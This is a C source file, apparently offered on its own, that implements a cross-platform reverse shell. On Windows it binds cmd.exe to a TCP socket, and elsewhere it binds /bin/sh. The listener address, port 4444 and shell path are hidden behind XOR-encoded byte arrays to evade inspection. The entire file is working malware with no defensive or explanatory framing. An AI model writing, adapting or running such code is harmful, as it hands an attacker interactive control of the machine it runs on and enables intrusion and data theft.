#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void xor_decrypt(char *str, char key) {
    while (*str) {
        *str ^= key;
        str++;
    }
}

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main(void) {
    char host[] = {0x13, 0x1b, 0x10, 0x0c, 0x13, 0x14, 0x1a, 0x0c, 0x13, 0x0c, 0x13, 0x12, 0x12, 0x00};
    char port[] = {0x16, 0x16, 0x16, 0x16, 0x00};
    char shell[] = {0x0d, 0x40, 0x4b, 0x4c, 0x0d, 0x51, 0x4a, 0x00};

    xor_decrypt(host, 0x22);
    xor_decrypt(port, 0x22);
    xor_decrypt(shell, 0x22);

    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    WSAStartup(MAKEWORD(2, 2), &wsa);
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    inet_pton(AF_INET, host, &addr.sin_addr);
    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
    CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sock);
    WSACleanup();
    return 0;
}
#else
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    char host[] = {0x13, 0x1b, 0x10, 0x0c, 0x13, 0x14, 0x1a, 0x0c, 0x13, 0x0c, 0x13, 0x12, 0x12, 0x00};
    char port[] = {0x16, 0x16, 0x16, 0x16, 0x00};
    char shell[] = {0x0d, 0x40, 0x4b, 0x4c, 0x0d, 0x51, 0x4a, 0x00};

    xor_decrypt(host, 0x22);
    xor_decrypt(port, 0x22);
    xor_decrypt(shell, 0x22);

    int sock;
    struct sockaddr_in addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    inet_pton(AF_INET, host, &addr.sin_addr);

    connect(sock, (struct sockaddr *)&addr, sizeof(addr));

    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);

    execve(shell, NULL, NULL);
    return 0;
}
#endif
